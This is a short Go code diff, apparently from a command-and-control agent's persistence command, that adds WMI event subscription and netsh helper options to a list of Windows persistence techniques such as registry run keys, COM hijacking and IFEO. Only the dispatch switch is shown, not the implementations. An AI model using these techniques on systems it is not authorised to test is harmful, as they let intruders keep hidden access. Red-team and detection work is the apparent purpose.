@@ -71,10 +71,14 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 		return persistTimeProvider(args)
 	case "port-monitor":
 		return persistPortMonitor(args)
+	case "wmi-event", "wmi":
+		return persistWMIEvent(args)
+	case "netsh-helper", "netsh":
+		return persistNetshHelper(args)
 	case "list":
 		return listPersistence(args)
 	default:
-		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility, active-setup, time-provider, port-monitor, or list", args.Method)
+		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility, active-setup, time-provider, port-monitor, wmi-event, netsh-helper, or list", args.Method)
 	}
 }
 
